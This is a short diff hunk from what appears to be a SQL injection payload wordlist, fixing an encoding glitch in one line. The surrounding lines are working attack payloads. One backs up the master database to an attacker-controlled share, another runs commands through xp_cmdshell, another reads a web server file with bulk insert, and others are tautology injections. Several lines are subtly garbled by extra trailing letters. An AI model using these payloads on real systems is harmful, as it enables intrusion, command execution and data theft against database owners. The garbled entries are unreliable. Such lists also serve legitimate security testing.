@@ -84,7 +84,7 @@ select @@servernamee
 select @@microsoftversione
 select * from master..sysserverse
 BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
-create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.aspâ'" select * from myfile"--
+create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.asp'" select * from myfile"--
 exec master..xp_cmdshell 'ipconfig+/all'	
 1 and 1=1
 1' or '1'='1
